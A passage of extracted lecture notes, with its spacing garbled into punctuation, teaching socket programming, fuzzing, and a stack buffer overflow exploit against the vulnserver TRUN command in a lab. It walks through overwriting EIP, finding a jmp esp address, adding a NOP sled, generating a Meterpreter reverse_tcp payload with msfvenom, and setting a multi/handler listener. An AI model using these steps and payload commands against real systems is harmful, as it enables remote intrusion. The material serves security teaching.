!
!
!
If!I!ran!python)print_name.py)Rob)6,!sys.argv[0]!would!be!!
!
!
!
print_name.py.!sys.argv[1]!would!be!Rob!and!sys.argv[2]!would!be!6.!
!
!
!
Note!that!all!data!!
)
b. for)loops)
)
)
)
All!for-loops!specify!the!value!the!loop!starts!at,!the!value!the!loop!!
!
!
terminates!at,!and!the!increment.!In!python,!the!syntax!is:!
!
!
!
for)i)in)range(0,)10):)
)
)
)
print!“Hello!Rob”!
!
c. socket.settimeout())
)
)
)
The!.settimeout()!allows!the!programmer!to!specify!the!maximum!!
!
!
number!of!seconds!before!a!socket!throws!a!timeout!exception.!!
!
!
Example:!conn.settimeout(5)!
)
d. try/except)
i. Syntax)
)
)
)
)
)
)
)
try:)
)
)
)
)
some)code)
)
)
)
except:)
)
)
)
)
code)to)execute)on)any)error)
)
)
)
)
)
)
OR!
!
!
!
!
try:)
)
)
)
)
some)code)
)
)
)
except)socket.timeout:)
)
)
)
)
code)to)execute)on)socket)timeout)error)
)
!
7!
ii. socket.error!
!
!
!
!
This!error!is!thrown!when!a!connected!socket!receives!an!RST.!
!
iii. socket.timeout!
!
!
!
!
!
!
This!error!is!thrown!after!a!socket!waits!for!some!number!of!!
!
!
!
seconds!without!receiving!data.!
!
e. Writing)a)port)scanner!
i. See!port-scanner.py!
5. Fuzzing!
a. socket.send())
)
)
)
The!.send()!function!transmits!data!over!an!already!connected!socket.!!
!
!
It!is!up!to!the!destination!to!process!that!data!appropriately.!
!
!
!
For!example,!conn.send(“Rob)6”))!would!send!a!five!character!! !
!
!
sequence!to!the!destination.!
)
b. Interacting)with)a)network)service)
)
)
)
Most!network!service!commands!have!the!following!syntax:!
!
!
!
!\r\n!
)
)
)
For!example,!specifying!a!user!over!SMTP!uses!the!user)command:!
!
!
!
user)rob\r\n)
)
!
!
)
)
)
c. Fuzzing)
)
)
)
Fuzzing!is!the!process!of!trying!incrementally!more!malicious!input!!
!
!
until!the!application!crashes.!In!the!case!above,!one!could!fuzz!the!!
!
!
SMTP!user!command!to!provoke!a!buffer!overflow!by!trying!longer!!
!
!
and!longer!usernames:!
!
!
!
!
for)i)in)range(0,)10000,)10):)
)
)
)
badname=”A”)*)i)
)
)
)
conn.send(“user)%s\r\n”)%)badname))
)
)
)
This!will!try!usernames!(of!all!As)!between!length!0!and!length!10000!!
!
!
at!increments!of!10.!
)
!
8!
d. Writing)a)fuzzer)
i. We!will!be!fuzzing!the!TRUN!command!on!vulnserver.!Note!
that!TRUN!is!only!vulnerable!to!a!buffer!overflow!when!the!
command’s!argument!is!prefaced!with!a!period.)
ii. See!fuzzer.py)
e. Observing)a)crash)in)Immunity)
)
)
)
While!observing!a!crash!in!Immunity,!you!want!to!pay!attention!to!the!
!
!
eip!value.!This!will!indicate!what!part!of!your!malicious!input!is!!
!
!
overwriting!the!saved!instruction!address!on!the!stack.!When!the!!
!
!
vulnerable!function!returns,!your!malicious!input!will!removed!from!!
!
!
the!stack!and!loaded!into!the!instruction!pointer!as!if!it!were!a!real!!
!
!
instruction’s!address.)
)
6. Taking!Control!of!a!Crash!
a. Fine)tuning)your)crash)
)
)
)
We!generally!need!to!know!precisely!where!a!crash!occurs!what!!
!
!
precise!bytes!end!up!overwriting!the!saved!instruction!address.!!
!
!
Fuzzing,!however,!often!leaves!us!with!a!range!instead.!To!address!!
!
!
this!issue,!we!can!fine!tune!it!by!removing!the!for!loop!from!the!fuzzer!!
!
!
and!adding!some!differentiation!to!our!malicious!input.!For!example,!!
!
!
if!you!know!the!overflow!causes!a!crash!at!70!bytes,!you!might!use!the!
!
!
following!malicious!string:!
!
!
!
Badstr)=)“A”)*)70)+)“B”)*)4)+)“C”)*)10)
)
)
)
If!you!observe!any!\x41!values!in!the!eip!register,!then!you!have!too!!
!
!
much!“garbage”!and!you!might!adjust!it!as!follows:!
)
)
)
Badstr)=)“A”)*68)+)“B”)*)4)+)“C”)*)10)
)
)
)
If!you!observe!any!\x43!values,!you!don’t!have!enough!“garbage”!and!!
!
!
you!might!adjust!it!as!follows:!
!
)
)
Badstr)=)“A”)*)72)+)“B”)*)4)+)“C”)*)10)
)
)
)
The!goal!is!to!fine!tune!the!exploit!until!your!eip!register!reads!!!
!
!
\x42\x42\x42\x42!during!a!crash.!This!will!tell!you!to!put!the!jump!!
!
!
instruction!that!redirects!execution!to!the!payload.!
)
)
)
b. Locating)a)jump)instruction)
)
)
)
This!particular!exploit!will!require!a!jump!instruction!that!routes!code!
!
!
execution!to!the!top!of!the!stack!(jmp!esp).!Immunity!Debugger!has!a!!
!
9!
!
!
search!tool!that!allows!you!to!search!for!instructions.!This!can!be!done!
!
!
by!right!clicking!in!the!instruction!window!pane.!
!
!
!
Note!that,!because!most!modern!computers!have!a!little!endian!!
!
!
architecture,!any!addresses!you!find!need!to!have!their!bytes!! !
!
!
reversed.!If!Immunity!indicates!that!there!is!a!jump!instruction!!!
!
!
located!at!address!12345678,!you!would!insert!this!into!your!exploit!!
!
!
in!the!following!way:!
!
!
!
eip!=!“\x78\x56\x34\x12”!
!
!
!
One!of!these!instructions!may!not!always!readily!available.!Immunity!!
!
!
has!a!module!viewer!tool!(which!can!be!found!by!hovering!over!the!!
!
!
controls!along!the!top!of!the!application)!that!will!allow!you!to!see!all!!
!
!
of!the!modules!an!application!loads!when!it!launches.!Often,!a!jump!!
!
!
instruction!from!any!of!these!will!be!sufficient!as!long!as!the!module!!
!
!
does!not!have!ASLR!(Address!Space!Layout!Randomization).!!
!
!
!
ASLR!is!a!technique!meant!to!minimize!the!extent!to!which!buffer!!
!
!
overflow!vulnerabilities!can!be!exploited!by!loading!instructions!into!!
!
!
different!addresses!during!each!program!run.!We!can!determine!!
!
!
which!modules!support!ASLR!by!using!mona.py.!
!
!
!
!
!
In!the!bar!along!the!bottom!of!Immunity’s!window,!type:!
!
!
!
!mona)modules!
!
)
)
Any!loaded!module!without!ASLR!should!work.!For!VulnServer,!!
!
!
vulnserver.exe!and!essfunc.dll!do!not!load!with!ASLR!and!either!can!!
!
!
be!used.!Vulnserver.exe,!however,!does!not!have!any!jmp!esp!! !
!
!
instructions.!
)
c. Adding)A)NOP)sled)
)
)
)
In!a!perfect!world,!we!would!be!able!to!structure!the!exploit!in!the!!
!
!
following!way:!
!
!
!
badcmd)=)garbage)+)eip)+)payload!
!
!
!
However,!in!reality,!additional!control!data!may!be!saved!when!a!!
!
!
function!call!occurs.!As!a!result,!the!stack!pointer!–!the!address!to!!
!
!
which!we!are!jumping!–!may!not!point!at!the!byte!immediately!before!!
!
!
the!saved!instruction!address.!
!
!
!
To!handle!this!scenario,!one!only!include!a!NOP!sled.!NOP!is!the!!
!
!
assembly!instruction!for!“no!operation”!or!“do!nothing”.!!By!inserting!!
!
10!
!
!
a!sequence!of!NOPs!between!the!jump!address!in!our!malicious!string!!
!
!
and!the!payload,!we!can!guarantee!that!the!payload!will!be!executed.!!
!
!
As!long!as!the!jmp!esp!instruction!redirects!code!execution!to!any!one!!
!
!
of!the!NOPs,!the!rest!will!be!executed!and!processor!will!“slide”!down!!
!
!
until!it!hits!the!payload.!
)
7. Completing!the!Exploit!
a. Generating)a)payload!
!
!
!
!
!
A!reverse-tcp!meterpreter!stager!payload!can!be!generated!using!the!!
!
!
following!bash!command.!Note!that!there!is!always!one!space! !!
!
!
between!flag!(-b)!and!the!value!for!that!flag!(\x00).!!
!
!
!
msfvenom!–p)windows/meterpreter/reverse_tcp)) )
)
)
)
)
)
LHOST=)LPORT=8421)–b)\x00)–e)))
)
)
)
)
x86/shikata_ga_nai)–f)python!
!
!
!
-p!!indicates!the!payload!that!will!be!encoded.!
!
!
!
LHOST!and!LPORT!values!are!arguments!to!the!meterpreter!payload.!!
!
!
Note:!LHOST!must!be!the!IP!of!your!Kali!VM.!
!
!
!
-b!references!bytes!that!cannot!appear!in!the!shellcode.!The!example!!
!
!
provided,!the!null!byte!(\x00),!terminates!a!socket!read.!If!this!!!
!
!
appeared!in!a!payload,!it!would!terminate!the!socket!read!of!the!!
!
!
payload.!There!may!be!other!special!bytes.!
!
!
!
-e!specifies!the!encoding!scheme!of!the!payload.!Will!it!appear!as!!
!
!
shellcode?!Powerscript?!
!
!
!
-f!specifies!the!language!of!the!exploit.!You!will!be!able!to!simply!copy!!
!
!
and!paste!the!output!of!msfvenom!into!your!exploit.!
!
!
!
!
One!the!payload!has!been!generated,!it!merely!needs!to!be!appended!!
!
!
to!the!malicious!string!after!the!nopsled.!At!this!point,!the!structure!of!!
!
!
your!malicious!string!should!be:!
!
!
!
garbage&=&"A"&*&2006&
!
!
eip&=&"\xAF\x11\x50\x62"& 
&
&
nop_sled&=&"\x90"&*&24&
&
&
buf=””&
&
&
buf+=&
&
!
11!
&
&
badstr=garbage+eip+nopsled+buf+”\r\n” 
!
!
!
!
!
!
!
b. Setting)a)handler!
!
!
!
In!a!separate!terminal!tab,!we!can!run!the!command!msfconsole!to!!
!
!
launch!the!Metasploit!console.!Once!the!Metasploit!console!is!open,!!
!
!
we!will!run!the!following!command!sequence!to!launch!a!Meterpreter!!
!
!
handler:!
!
!
!
use)multi/handler)
!
!
set)payload)windows/meterpreter/reverse_tcp)
)
)
set)lhost))
)
)
set)lport))
)
)
exploit)
!
c. Exploitation!
!
!
!
At!this!point,!you!should!be!ready!to!try!out!your!exploit.!After!!!
!
!
running!your!exploit!script,!your!Meterpreter!handler!should!tell!you!!
!
!
that!you!have!an!open!Meterpreter!session.!
!
!
!
See:!exploit.py!
!
8. Writing!Custom!Payloads!(As!Time!Permits)!
!
!
See:!custom-payload-calc.py!and!custom-payload-add-user.py!
!
9. References!
!
!
!
A!list!of!references!can!be!found!in!the!GitHub!repository!listed!at!the!
!
beginning!of!the!lecture!notes.!